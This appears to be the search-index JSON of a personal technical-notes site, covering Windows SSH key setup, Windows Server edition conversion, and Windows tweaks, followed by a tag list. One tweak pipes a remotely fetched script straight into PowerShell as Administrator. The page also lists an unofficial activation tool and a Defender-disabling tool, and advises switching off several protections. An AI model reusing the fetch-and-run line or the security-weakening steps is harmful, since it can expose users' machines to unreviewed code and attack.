"ssh-server", "powershell", "rsa-keys"]}, {"location": "windows/ssh-server/#powershell-as-default-shell-for-ssh", "title": "<code>PowerShell</code> as Default Shell for SSH", "text": "<p>By default the SSH client uses the Windows command prompt as the default shell.</p> <p>We can change the default shell to PowerShell running the following PowerShell command:</p> <pre><code>New-ItemProperty -Path \"HKLM:\\SOFTWARE\\OpenSSH\" -Name DefaultShell -Value \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -PropertyType String -Force\n</code></pre> <p>Next to you connet to the Windows SSG server it should start the PowerShell shell.</p> <p>It should look something like this:</p> <p></p>", "tags": ["windows", "ssh-server", "powershell", "rsa-keys"]}, {"location": "windows/useful-software/", "title": "Useful Software", "text": "", "tags": ["utilities", "windows"]}, {"location": "windows/useful-software/#win-10-iso-official-download", "title": "Win 10 ISO Official Download", "text": "<p>Microsoft Official Windows 10 Download</p>", "tags": ["utilities", "windows"]}, {"location": "windows/useful-software/#list-of-useful-software", "title": "List of Useful Software", "text": "Application Description MAS Windows &amp; Office Activation Windows Tweaker 4 for Windows 10 Windows Tweaker Defender Control Windows Defender control Link Shell Extension Symlinks For Windows Winaero Tweaker Winaero Tweaker Autologon Autologon at boot", "tags": ["utilities", "windows"]}, {"location": "windows/windows-servers/", "title": "Windows Servers", "text": "", "tags": ["utilities", "windows", "servers"]}, {"location": "windows/windows-servers/#basic-setup", "title": "Basic Setup", "text": "<p>At Server Manager click <code>Configure this local server</code></p> <ul> <li>Computer name - rename the server's name</li> <li>Remote Desktop - allow RDP</li> <li>Ethernet instance - disable IPV6</li> <li>Feedback &amp; Diagnostics - set <code>Feedback frequency</code> to <code>Never</code></li> <li>IE Enhanced Security Configuration - Off</li> <li>Time zone - set the current timezone, At <code>Internet Time</code> tab chanche <code>time.windwos.com</code> to <code>time.nist.gov</code></li> </ul> <p>Open gpedit.msc with Run</p> <ul> <li>Local Computer Policy -&gt; Administrative Templates -&gt; System -&gt; Display Shutdown Even Tracker - Disable</li> <li>Local Computer Policy -&gt; Windows Settings -&gt; Security Settings -&gt; Local Policies -&gt; Security Options -&gt;Interactive logon: Do not require CTRL+ALT+DEL - Enable</li> </ul>", "tags": ["utilities", "windows", "servers"]}, {"location": "windows/windows-servers/#convert-evaluation-copy-to-full-version", "title": "Convert Evaluation Copy to Full Version", "text": "<p>When using the Evaluation version of Windows Server, the desktop displays the current build and the time until the end of the grace period (Windows License valid for 180 days).</p>", "tags": ["utilities", "windows", "servers"]}, {"location": "windows/windows-servers/#windows-server-2022", "title": "Windows Server 2022", "text": "<p>Run from Powershell:</p> <p>Windows Server 2022 Standard</p> <pre><code>dism /online /set-edition:serverstandard /productkey:VDYBN-27WPP-V4HQT-9VMD4-VMK7H /accepteula\n</code></pre> <p>Windows Server 2022 Datacenter:</p> <pre><code>dism /online /set-edition:serverdatacenter /productkey:WX4NM-KYWYW-QJJR4-XV3QB-6VM33 /accepteula\n</code></pre>", "tags": ["utilities", "windows", "servers"]}, {"location": "windows/windows-servers/#windows-server-2019", "title": "Windows Server 2019", "text": "<p>Run from Powershell:</p> <p>Windows Server 2019 Standard</p> <pre><code>dism /online /set-edition:ServerStandard /productkey:N69G4-B89J2-4G8F4-WWYCC-J464C /accepteula\n</code></pre> <p>Windows Server 2019 Datacenter:</p> <pre><code>dism /online /set-edition:ServerDatacenter /productkey:WMDGN-G9PQG-XVVXX-R3X43-63DFG /accepteula\n</code></pre>", "tags": ["utilities", "windows", "servers"]}, {"location": "windows/windows-ssh-agent-with-keys/", "title": "Windows SSH Client with ed25519 Keys for Secure Connections", "text": "<p>In the modern digital age, ensuring the security of your connections is critical. This guide will walk you through the steps to configure the SSH client and SSH agent on Windows using ed25519 keys, allowing for secure connections to services like Git and remote servers.</p>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-ssh-agent-with-keys/#introduction-to-ssh-and-ed25519-keys", "title": "Introduction to SSH and ed25519 Keys", "text": "<p>SSH, or Secure Shell, is a cryptographic network protocol for secure communication over an unsecured network. It is particularly used for secure logins, file transfers, and command-line operations.</p> <p>ed25519 is a public-key signature system that is renowned for high security with relatively short key lengths. This makes it faster and more efficient compared to older algorithms such as RSA.</p>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-ssh-agent-with-keys/#openssh-client-installation", "title": "OpenSSH Client Installation", "text": "<p>To utilize SSH, you need to ensure that the OpenSSH client is installed on your Windows system.</p> <p>Note</p> <p>The above below should be performed in PowerShell with Administrator privileges.</p> <ol> <li>Check if OpenSSH Client is available by running the following cmdlet:</li> </ol> <pre><code>Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'\n</code></pre> <p>If OpenSSH Client is not installed, the output will be:</p> <pre><code>Name: OpenSSH.Client~~~~0.0.1.0\nState: NotPresent\n</code></pre> <p>If it's not present, proceed to the next step to install it.</p> <ol> <li>Install the OpenSSH Client by running the following command:</li> </ol> <pre><code># Install the OpenSSH Client\nAdd-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0\n</code></pre> <p>The command should return:</p> <pre><code>Path:\nOnline: True\nRestartNeeded: False\n</code></pre>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-ssh-agent-with-keys/#setting-up-ssh-agent-in-windows", "title": "Setting Up SSH Agent in Windows", "text": "<p>The SSH Agent is a background service that stores your keys. When connecting to a remote host using SSH, the agent can automatically provide the key.</p> <p>Note</p> <p>The above below should be performed in PowerShell with Administrator privileges.</p> <ol> <li>Set SSH Agent to start automatically at boot:</li> </ol> <pre><code>Set-Service -Name ssh-agent -StartupType 'Automatic'\n</code></pre> <ol> <li>Start the SSH Agent service:</li> </ol> <pre><code>Start-Service -Name ssh-agent\n</code></pre> <ol> <li>Test the SSH Agent Is Running:</li> </ol> <pre><code>Get-Service -Name ssh-agent\n</code></pre> <p>The output should be:</p> <pre><code>Status   Name               DisplayName\n------   ----               -----------\nRunning  ssh-agent          OpenSSH Authentication Agent\n</code></pre>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-ssh-agent-with-keys/#generating-and-adding-ed25519-ssh-keys", "title": "Generating and Adding ed25519 SSH Keys", "text": "<p>Note</p> <p>The above below should be performed in PowerShell with regular user privileges.</p> <ol> <li>Generate ed25519 SSH keys:</li> </ol> <pre><code>ssh-keygen -t ed25519 -C \"your_email@example.com\"\n</code></pre> <p>This command generates an ed25519 key pair. The default location for the keys is <code>C:\\Users\\&lt;YourUsername&gt;\\.ssh</code>. The private key is named <code>id_ed25519</code> and the public key is named <code>id_ed25519.pub</code>.</p> <ol> <li>Adding the ed25519 SSH Key to the SSH Agent:</li> </ol> <pre><code>ssh-add $env:USERPROFILE\\.ssh\\id_ed25519\n</code></pre> <p>If your keys are stored in a different location or have a different name, you can specify the full path to the key file as an argument to <code>ssh-add</code>. For example:</p> <pre><code> ssh-add C:\\path\\to\\your\\private-key-file\n</code></pre>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-ssh-agent-with-keys/#importing-existing-ed25519-ssh-keys-optional", "title": "Importing Existing ed25519 SSH Keys (Optional)", "text": "<p>If you already have an existing pair of ed25519 SSH keys that you would like to use, you can import them into your SSH Agent.</p> <p>Note</p> <p>The above below should be performed in PowerShell with regular user privileges.</p> <ol> <li> <p>Copy your existing private key to the default SSH folder. The default folder for SSH keys is typically <code>C:\\Users\\&lt;YourUsername&gt;\\.ssh</code>. Make sure the private key file you are copying is named <code>id_ed25519</code>.</p> </li> <li> <p>Add the existing ed25519 SSH Key to the SSH Agent:</p> </li> </ol> <pre><code>ssh-add $env:USERPROFILE\\.ssh\\id_ed25519\n</code></pre> <p>Note: If your private key file is located in a different path or has a different name, you can specify the full path to the key file as an argument to <code>ssh-add</code>. For example:</p> <pre><code>ssh-add C:\\path\\to\\your\\private-key-file\n</code></pre> <ol> <li>Copy your existing public key to the servers or services you want to connect to. This typically involves appending the contents of your public key file to the <code>~/.ssh/authorized_keys</code> file on the server.</li> </ol>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-ssh-agent-with-keys/#step-5-using-ssh-with-ed25519-keys-for-secure-connections", "title": "Step 5: Using SSH with ed25519 Keys for Secure Connections", "text": "<p>Now that you have your ed25519 SSH keys generated or imported, and added to the SSH Agent, you can use SSH to connect to remote servers or services like Git securely.</p> <p>For example, to connect to a remote server:</p> <pre><code>ssh username@remote_host\n</code></pre> <p>Using SSH keys will also allow you to interact with Git repositories securely, which is especially helpful when dealing with private repositories or pushing code changes.</p>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-ssh-agent-with-keys/#wrapping-up", "title": "Wrapping Up", "text": "<p>By following this guide, you have configured the SSH client and SSH agent on your Windows system using ed25519 keys. This configuration ensures secure communication with services like Git and remote servers, safeguarding the integrity and security of your data.</p>", "tags": ["SSH", "Windows", "ed25519", "OpenSSH", "Git", "Security"]}, {"location": "windows/windows-tweaks/", "title": "Windwos 10/11 Tweeks", "text": "<p>Some tips and tricks and Tweeks for Windows 10/11 that may be helpful or even essential for you</p>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/windows-tweaks/#deblot-windwos-1011-powershell-script", "title": "Deblot Windwos 10/11 Powershell Script", "text": "<p>Source: Windows10Debloater Github Page</p> <p>Run as Administrator:</p> <pre><code>iwr -useb https://git.io/debloat|iex\n</code></pre> <p></p>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/windows-tweaks/#enable-the-legacy-context-menu-in-windows-11", "title": "Enable the Legacy Context Menu in Windows 11", "text": "<p>To enable the context menu that appeared in Windows 10 and earlier, you can use the following PowerShell snippet.</p> <pre><code>New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" -Value \"\" -Force\n</code></pre> <p>You may need to log out and log back in or restart\u00a0<code>explorer.exe</code>.</p> <pre><code>Get-Process explorer | Stop-Process\n</code></pre> <p>The context menu will now look like this:</p> <p></p>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/windows-tweaks/#allow-icmp-ping-in-windows-firewall", "title": "Allow ICMP (Ping) in Windows Firewall", "text": "<p>The following commands will allow ICMP (Ping) in Windows Firewall. Use Powershell as Administrator to run the following commands.</p> <p>For IPv4:</p> <pre><code>netsh advfirewall firewall add rule name=\"ICMP Allow incoming V4 echo request\" protocol=\"icmpv4:8,any\" dir=in action=allow\n</code></pre> <p>For IPv6:</p> <pre><code>netsh advfirewall firewall add rule name=\"ICMP Allow incoming V6 echo request\" protocol=\"icmpv6:8,any\" dir=in action=allow\n</code></pre>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/windows-tweaks/#activate-administrator-user", "title": "Activate Administrator User", "text": "<p>Hit the Windows Key + R and type</p> <pre><code>lusrmgr.msc\n</code></pre> <p>Edit Administrator, remove the - [x] Account is disable. ok</p> <p>Right Click on Administrator and click Set Password</p>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/windows-tweaks/#lunch-network-connections", "title": "Lunch \"Network Connections\"", "text": "<p>Hit the Windows Key + R and type</p> <pre><code>ncpa.cpl\n</code></pre>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/windows-tweaks/#add-program-to-startup-windows-7810-servers", "title": "Add Program to Startup - Windows 7,8,10 &amp; Servers", "text": "<p>Hit WIN+R or from start menu search <code>run</code> and press enter. At run dialog enter <code>shell:common startup</code>:</p> <p></p> <ul> <li>Create shortcut for the program you want to auto startup when Windows boots.</li> <li>Move the shortcut to the <code>Startup</code> folder that opened before.</li> </ul>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/windows-tweaks/#reboot-or-shutdown-windows-from-command-line-cmd", "title": "Reboot or Shutdown Windows From Command Line (CMD)", "text": "<p>Reboot windows computer This command will set a time out of 10 seconds to close the applications. After 10 seconds, windows reboot will start.</p> <pre><code>shutdown /r /t 10\n</code></pre> <p>Force reboot</p> <pre><code>shutdown /r /f /t 0\n</code></pre> <p>Force Shutdown</p> <pre><code>shutdown /s /f /t 0\n</code></pre>", "tags": ["Windwos", "Tweeks"]}, {"location": "windows/guides/declare-locations/", "title": "Declare Locations as \"Inside Your Local Network\"", "text": "<p>Warning</p> <p>The Intranet Zone is the most trusted and least protected zone. DO NOT put any subnets or IP addresses in this zone unless they are TOTALLY under YOUR control. That includes ANY public server, web site, subnet, or IP address.</p> <ul> <li> <p>Select 'Control Panel'/'Internet Properties'/'Security' tab. (Alternatively, open Internet Explorer and select 'Tools'/'Internet Options'/'Security' tab.)</p> </li> <li> <p>Highlight 'Local Intranet' and click 'Sites'.</p> </li> <li> <p>Set the following: Uncheck 'Automatically detect intranet network'.Check 'Include all local (intranet) sites not listed in other zones'.Uncheck 'Include all sites that bypass the proxy server'.Check 'Include all network paths (UNCs)'.\u200b</p> </li> <li> <p>Click 'Advanced'</p> </li> <li> <p>Uncheck 'Require server verification (https:) for all sites in this zone'.</p> </li> <li> <p>In the field labeled 'Add this web site to the zone:', add your local, private subnet using an asterisk for a network mask and click 'Add'. E.g. If your home (local) network is 192.168.25.0 with a mask of 255.255.255.0, enter '192.168.25.*' (without the quotes).</p> </li> </ul> <p>Note</p> <p>Entries can be:\u200b</p> <pre><code>* Individual IP addresses (e.g. '192.168.5.25', etc.),\n* Class C subnets (e.g. '192.168.27.*'),\n* Class B subnets (e.g. '172.16.*.*'), or\n* Class A subnets (e.g. '10.*.*.*')\u200b\n</code></pre> <p>You can add as many addresses as you need to the list It can be handy add the address of a VPN subnet to the list if it is also private and you TOTALLY trust it.\u200b</p> <ul> <li>Close out with 'Close'/'OK'/'OK' and close the Control Panel (or Internet Explorer).</li> </ul>", "tags": ["utilities", "network", "windows"]}, {"location": "windows/guides/email-from-task-scheduler/", "title": "Send Emails From The Windows Task Scheduler", "text": "<p>First, download SendEmail, a free (and open source) tool for sending emails from the command line. Extract the downloaded archive into a folder on your computer.</p> <p></p> <p>Next, launch the Windows Task Scheduler and create a new task \u2013 consult our guide to creating scheduled tasks for more information. You can create a task that automatically sends an email at a specific time or a task that sends an email in response to a specific event.</p> <p>When you reach the Action window, select Start a program instead of Send an e-mail.</p> <p> In the Program/script box, use the Browse button and navigate to the SendEmail.exe file on your computer.</p> <p></p> <p>Finally, you\u2019ll have to add the arguments required to authenticate with your SMTP server and construct your email. Here\u2019s a list of the options you can use with SendEmail:</p>", "tags": ["utilities", "windows"]}, {"location": "windows/guides/email-from-task-scheduler/#server-options", "title": "Server Options", "text": "<ul> <li>-f EMAIL \u2013 The email address you\u2019re sending from.</li> <li>-s SERVER:PORT \u2013 The SMTP server and port it requires.</li> <li>-xu USERNAME \u2013 The username you need to authenticate with the SMTP server.</li> <li>-xp PASSWORD \u2013 The password you need to authenticate with the SMTP server.</li> <li>-o tls=yes \u2013 Enables TLS encryption. May be necessary for some SMTP servers.</li> </ul> <p>If you\u2019re using Gmail\u2019s SMTP servers, these are the server options you\u2019ll need:</p> <ul> <li>-s smtp.gmail.com:587 -xu you@gmail.com -xp password -o tls=yes</li> </ul> <p>Of course, you\u2019ll have to enter your own email address and password here.</p>", "tags": ["utilities", "windows"]}, {"location": "windows/guides/email-from-task-scheduler/#destination-options", "title": "Destination Options", "text": "<ul> <li>-t EMAIL \u2013 The destination email address. You can send an email to multiple addresses by including a space between each address after the -t option.</li> <li>-cc EMAIL \u2013 Any addresses you\u2019d like to CC on the email. You can specify multiple addresses by placing a space between each email address, just as with the -t command above.</li> <li>-bcc EMAIL \u2013 The BCC version of the CC option above.</li> </ul>", "tags": ["utilities", "windows"]}, {"location": "windows/guides/email-from-task-scheduler/#email-options", "title": "Email Options", "text": "<ul> <li>-u SUBJECT \u2013 The subject of your email</li> <li>-m BODY \u2013 The message body text of your email.</li> <li>-a ATTACHMENT \u2013 The path of a file you\u2019d like to attach. This is optional.</li> </ul> <p>For example, let\u2019s say your email address is example@gmail.com and you\u2019d like to send an email to <code>person@example.com</code>. You\u2019d use the following options:</p> <pre><code>-f example@gmail.com -t person@example.com -u Subject -m This is the body text! -s smtp.gmail.com:587 -xu example@gmail.com -xp password -o tls=yes\n</code></pre> <p>Once you\u2019ve put together your options, copy and paste them into the Add arguments box.</p> <p></p> <p>Save your task and you\u2019re done. Your task will automatically send email on the schedule (or in response to the event) you specified.</p>", "tags": ["utilities", "windows"]}, {"location": "tags/", "title": "Tags and Categories", "text": ""}, {"location": "tags/#3g-modem", "title": "3g-modem", "text": "<ul> <li>3g Modem Host Configuration</li> </ul>"}, {"location": "tags/#cookies", "title": "Cookies", "text": "<ul> <li>Cookies Policy</li> </ul>"}, {"location": "tags/#git", "title": "Git", "text": "<ul> <li>Windows SSH with ed25519 Keys</li> </ul>"}, {"location": "tags/#homelab", "title": "HomeLab", "text": "<ul> <li>Synology NAS</li> </ul>"}, {"location": "tags/#iid", "title": "IID", "text": "<ul> <li>IID Generator &amp; Validator</li> </ul>"}, {"location": "tags/#nas", "title": "NAS", "text": "<ul> <li>Synology NAS</li> <li>Free 80,443 Ports</li> </ul>"}, {"location": "tags/#openssh", "title": "OpenSSH", "text": "<ul> <li>Windows SSH with ed25519 Keys</li> </ul>"}, {"location": "tags/#proxmox", "title": "Proxmox", "text": "<ul> <li>Windows VM Configuration</li> </ul>"}, {"location": "tags/#ssh", "title": "SSH", "text": "<ul> <li>Windows SSH with ed25519 Keys</li> </ul>"}, {"location": "tags/#security", "title": "Security", "text": "<ul> <li>Windows SSH with ed25519 Keys</li> </ul>"}, {"location": "tags/#synology", "title": "Synology", "text": "<ul> <li>Synology NAS</li> </ul>"}, {"location": "tags/#tweeks", "title": "Tweeks", "text": "<ul> <li>Windwos 10/11 Tweeks</li> </ul>"}, {"location": "tags/#ubuntu", "title": "Ubuntu", "text": "<ul> <li>Free Port 53 on Ubuntu</li> </ul>"}, {"location": "tags/#virtio", "title": "VirtIO", "text": "<ul> <li>Windows VM Configuration</li> </ul>"}, {"location": "tags/#windows", "title": "Windows", "text": "<ul> <li>Windows SSH with ed25519 Keys</li> </ul>"}, {"location": "tags/#windows-virtual-machines", "title": "Windows Virtual Machines", "text": "<ul> <li>Windows VM Configuration</li> </ul>"}, {"location": "tags/#windwos", "title": "Windwos", "text": "<ul> <li>Windwos 10/11 Tweeks</li> </ul>"}, {"location": "tags/#adb", "title": "adb", "text": "<ul> <li>ADB Cheat Sheet</li> </ul>"}, {"location": "tags/#admonition", "title": "admonition", "text": "<ul> <li>Admonitions</li> </ul>"}, {"location": "tags/#affiliate", "title": "affiliate", "text": "<ul> <li>Affiliate Disclosure</li> </ul>"}, {"location": "tags/#android", "title": "android", "text": "<ul> <li>ADB Cheat Sheet</li> <li>Apktool</li> <li>PT Application</li> <li>JADX Decompiler</li> <li>MobSF</li> <li>SSL Pinning Bypass</li> </ul>"}, {"location": "tags/#apktool", "title": "apktool", "text": "<ul> <li>Apktool</li> </ul>"}, {"location": "tags/#application", "title": "application", "text": "<ul> <li>PT Application</li> </ul>"}, {"location": "tags/#autofs", "title": "autofs", "text": "<ul> <li>SMB Mount With autofs</li> </ul>"}, {"location": "tags/#automation", "title": "automation", "text": "<ul> <li>DDNS Cloudflare Bash</li> <li>DDNS Cloudflare PowerShell</li> <li>Syncthing</li> <li>Motion Sensor Display Control</li> </ul>"}, {"location": "tags/#bash", "title": "bash", "text": "<ul> <li>DDNS Cloudflare Bash</li> <li>BrewUp</li> </ul>"}, {"location": "tags/#cheat-sheet", "title": "cheat-sheet", "text": "<ul> <li>ADB Cheat Sheet</li> <li>Npm Command-line Utility</li> <li>PM2 - Node.js Process Manager</li> <li>Pip Package Manager</li> <li>Supervisor Process Manager</li> <li>Virtual Environment</li> <li>Ruby Gem Package Manager</li> <li>Common Docker Commands</li> <li>Containers Cheat Sheet</li> <li>Images Cheat Sheet</li> <li>Docker Installation</li> <li>Networks &amp; Links Cheat Sheet</li> <li>Security &amp; Best Practices</li> <li>Git Cli Cheat Sheet</li> <li>Submodules Cheat Sheet</li> <li>GitHub Cli</li> </ul>"}, {"location": "tags/#cheatsheet", "title": "cheatsheet", "text": "<ul> <li>Gobuster CheatSheet</li> <li>Nmap CheatSheet</li> <li>XSS CheatSheet</li> </ul>"}, {"location": "tags/#chrome", "title": "chrome", "text": "<ul> <li>Chrome Extensions</li> </ul>"}, {"location": "tags/#cli", "title": "cli", "text": "<ul> <li>Cli Commands Collation</li> </ul>"}, {"location": "tags/#clickjacking", "title": "clickjacking", "text": "<ul> <li>Clickjacking Test Page</li> </ul>"}, {"location": "tags/#cloudflare", "title": "cloudflare", "text": "<ul> <li>DDNS Cloudflare Bash</li> <li>DDNS Cloudflare PowerShell</li> <li>Pi-hole Cloudflare DNS Sync</li> <li>Let's Encrypt with Cloudflare</li> <li>UDM Cloudflare DDNS</li> </ul>"}, {"location": "tags/#code-blocks", "title": "code-blocks", "text": "<ul> <li>Code Blocks</li> </ul>"}, {"location": "tags/#collation", "title": "collation", "text": "<ul> <li>Cli Commands Collation</li> </ul>"}, {"location": "tags/#commands", "title": "commands", "text": "<ul> <li>Cli Commands Collation</li> </ul>"}, {"location": "tags/#container", "title": "container", "text": "<ul> <li>Watchtower</li> </ul>"}, {"location": "tags/#content-tabs", "title": "content-tabs", "text": "<ul> <li>Content Tabs</li> </ul>"}, {"location": "tags/#ddns", "title": "ddns", "text": "<ul> <li>DDNS Cloudflare Bash</li> <li>DDNS Cloudflare PowerShell</li> </ul>"}, {"location": "tags/#debian", "title": "debian", "text": "<ul> <li>Disable IPv6 via Grub</li> </ul>"}, {"location": "tags/#decompiler", "title": "decompiler", "text": "<ul> <li>JADX Decompiler</li> </ul>"}, {"location": "tags/#diagram", "title": "diagram", "text": "<ul> <li>Diagrams</li> </ul>"}, {"location": "tags/#dns", "title": "dns", "text": "<ul> <li>Pi-hole Cloudflare DNS Sync</li> <li>Pi-hole with DOH on Docker</li> <li>Free Port 53 on Ubuntu</li> </ul>"}, {"location": "tags/#dns-over-https", "title": "dns-over-https", "text": "<ul> <li>Pi-hole with DOH on Docker</li> </ul>"}, {"location": "tags/#docker", "title": "docker", "text": "<ul> <li>Pi-hole Cloudflare DNS Sync</li> <li>Pi-hole with DOH on Docker</li> <li>Common Docker Commands</li> <li>Containers Cheat Sheet</li> <li>Images Cheat Sheet</li> <li>Docker Installation</li> <li>Networks &amp; Links Cheat Sheet</li> <li>Security &amp; Best Practices</li> <li>Watchtower</li> <li>Docker on Raspberry Pi</li> </ul>"}, {"location": "tags/#docker-compose", "title": "docker-compose", "text": "<ul> <li>Docker on Raspberry Pi</li> </ul>"}, {"location": "tags/#doh", "title": "doh", "text": "<ul> <li>Pi-hole with DOH on Docker</li> </ul>"}, {"location": "tags/#dsm", "title": "dsm", "text": "<ul> <li>SSH With RSA Keys</li> </ul>"}, {"location": "tags/#ed25519", "title": "ed25519", "text": "<ul> <li>Windows SSH with ed25519 Keys</li> </ul>"}, {"location": "tags/#edgerouter", "title": "edgerouter", "text": "<ul> <li>EdgeRouter</li> </ul>"}, {"location": "tags/#emojis", "title": "emojis", "text": "<ul> <li>Icons &amp; Emojis</li> </ul>"}, {"location": "tags/#endorsements", "title": "endorsements", "text": "<ul> <li>Website Endorsements</li> </ul>"}, {"location": "tags/#extensions", "title": "extensions", "text": "<ul> <li>Chrome Extensions</li> <li>Firefox Extensions</li> </ul>"}, {"location": "tags/#external-markdown", "title": "external-markdown", "text": "<ul> <li>Embed External Markdown</li> </ul>"}, {"location": "tags/#files-handling", "title": "files-handling", "text": "<ul> <li>Files Handling</li> </ul>"}, {"location": "tags/#firefox", "title": "firefox", "text": "<ul> <li>Firefox Extensions</li> </ul>"}, {"location": "tags/#frida", "title": "frida", "text": "<ul> <li>SSL Pinning Bypass</li> </ul>"}, {"location": "tags/#gem", "title": "gem", "text": "<ul> <li>Ruby Gem Package Manager</li> </ul>"}, {"location": "tags/#git_1", "title": "git", "text": "<ul> <li>Git Cli Cheat Sheet</li> <li>GitHub Cli</li> </ul>"}, {"location": "tags/#github", "title": "github", "text": "<ul> <li>Removing Sensitive Data</li> <li>Git Cli Cheat Sheet</li> <li>Submodules Cheat Sheet</li> <li>GitHub Cli</li> <li>BrewUp</li> </ul>"}, {"location": "tags/#gpu", "title": "gpu", "text": "<ul> <li>GPU Passthrough to VM</li> </ul>"}, {"location": "tags/#headings", "title": "headings", "text": "<ul> <li>Basic Formatting</li> </ul>"}, {"location": "tags/#history", "title": "history", "text": "<ul> <li>Removing Sensitive Data</li> </ul>"}, {"location": "tags/#homebrew", "title": "homebrew", "text": "<ul> <li>BrewUp</li> <li>Brew Snippets</li> </ul>"}, {"location": "tags/#horizontal-line", "title": "horizontal-line", "text": "<ul> <li>Basic Formatting</li> </ul>"}, {"location": "tags/#htpasswd", "title": "htpasswd", "text": "<ul> <li>htpasswd Password Generator</li> </ul>"}, {"location": "tags/#iterm2", "title": "iTerm2", "text": "<ul> <li>TouchID for sudo</li> </ul>"}, {"location": "tags/#icons", "title": "icons", "text": "<ul> <li>Icons &amp; Emojis</li> </ul>"}, {"location": "tags/#igpu", "title": "igpu", "text": "<ul> <li>iGPU Passthrough to VM</li> <li>iGPU Split Passthrough</li> </ul>"}, {"location": "tags/#images", "title": "images", "text": "<ul> <li>Images</li> </ul>"}, {"location": "tags/#information", "title": "information", "text": "<ul> <li>Affiliate Disclosure</li> <li>Cookies Policy</li> <li>Website Endorsements</li> <li>MIT License</li> <li>Privacy Policy</li> </ul>"}, {"location": "tags/#ipv6", "title": "ipv6", "text": "<ul> <li>Disable IPv6 on Proxmox</li> <li>Disable IPv6 via Grub</li> </ul>"}, {"location": "tags/#java", "title": "java", "text": "<ul> <li>JADX Decompiler</li> </ul>"}, {"location": "tags/#kali", "title": "kali", "text": "<ul> <li>Kali Linux</li> </ul>"}, {"location": "tags/#kali-linux", "title": "kali-linux", "text": "<ul> <li>Kali Linux</li> </ul>"}, {"location": "tags/#letsencrypt", "title": "letsencrypt", "text": "<ul> <li>Let's Encrypt with Cloudflare</li> </ul>"}, {"location": "tags/#license", "title": "license", "text": "<ul> <li>MIT License</li> </ul>"}, {"location": "tags/#links", "title": "links", "text": "<ul> <li>Links</li> </ul>"}, {"location": "tags/#linux", "title": "linux", "text": "<ul> <li>Syncthing</li> <li>Better Terminal Experience</li> <li>Files Handling</li> <li>General Snippets</li> <li>Locales &amp; Timezone</li> <li>LVM Partitions</li> <li>Memory &amp; Swap</li> <li>SSH Hardening with SSH Keys</li> <li>Identify Network Interfaces</li> </ul>"}, {"location": "tags/#lists", "title": "lists", "text": "<ul> <li>Tables, Lists and Quotes</li> </ul>"}, {"location": "tags/#locales", "title": "locales", "text": "<ul> <li>Locales &amp; Timezone</li> </ul>"}, {"location": "tags/#lvm", "title": "lvm", "text": "<ul> <li>LVM Partitions</li> </ul>"}, {"location": "tags/#macos", "title": "macOS", "text": "<ul> <li>Applications Tweaks</li> <li>Enable Root User</li> <li>TouchID for sudo</li> <li>UI Tweaks</li> <li>Brew Snippets</li> </ul>"}, {"location": "tags/#maco", "title": "maco", "text": "<ul> <li>Pyenv-virtualenv Multi Version</li> </ul>"}, {"location": "tags/#macos_1", "title": "macos", "text": "<ul> <li>Syncthing</li> <li>Better Terminal Experience</li> <li>SSH Passphrase to Keychain</li> <li>Terminal Snippets</li> <li>BrewUp</li> </ul>"}, {"location": "tags/#magic-mirror", "title": "magic-mirror", "text": "<ul> <li>Magic Mirror</li> </ul>"}, {"location": "tags/#magicmirror", "title": "magicmirror", "text": "<ul> <li>Magic Mirror 2.0</li> </ul>"}, {"location": "tags/#markdown", "title": "markdown", "text": "<ul> <li>Disable IPV6</li> <li>oh-my-zsh Install</li> <li>Snippets</li> <li>Awesome Pages Plugin</li> </ul>"}, {"location": "tags/#markdown-cheatsheet", "title": "markdown-cheatsheet", "text": "<ul> <li>About Markdown</li> <li>Admonitions</li> <li>Basic Formatting</li> <li>Code Blocks</li> <li>Content Tabs</li> <li>Diagrams</li> <li>Embed External Markdown</li> <li>Icons &amp; Emojis</li> <li>Images</li> <li>Links</li> <li>Tables, Lists and Quotes</li> </ul>"}, {"location": "tags/#mermaid", "title": "mermaid", "text": "<ul> <li>Diagrams</li> </ul>"}, {"location": "tags/#metasploit", "title": "metasploit", "text": "<ul> <li>Metasploit Framework</li> </ul>"}, {"location": "tags/#mkdocs", "title": "mkdocs", "text": "<ul> <li>About Markdown</li> <li>Admonitions</li> <li>Basic Formatting</li> <li>Code Blocks</li> <li>Content Tabs</li> <li>Diagrams</li> <li>Embed External Markdown</li> <li>Icons &amp; Emojis</li> <li>Images</li> <li>Links</li> <li>Tables, Lists and Quotes</li> </ul>"}, {"location": "tags/#motion-sensor", "title": "motion-sensor", "text": "<ul> <li>Motion Sensor Display Control</li> </ul>"}, {"location": "tags/#mount", "title": "mount", "text": "<ul> <li>SMB Mount With autofs</li> </ul>"}, {"location": "tags/#network", "title": "network", "text": "<ul> <li>Proxmox Networking</li> <li>Identify Network Interfaces</li> <li>Declare Locations as \"Inside Your Local Network\"</li> </ul>"}, {"location": "tags/#node", "title": "node", "text": "<ul> <li>Npm Command-line Utility</li> <li>PM2 - Node.js Process Manager</li> </ul>"}, {"location": "tags/#npm", "title": "npm", "text": "<ul> <li>Npm Command-line Utility</li> <li>PM2 - Node.js Process Manager</li> </ul>"}, {"location": "tags/#oh-my-zsh", "title": "oh-my-zsh", "text": "<ul> <li>Better Terminal Experience</li> <li>oh-my-zsh on Synology NAS</li> </ul>"}, {"location": "tags/#package-manager", "title": "package-manager", "text": "<ul> <li>Pip 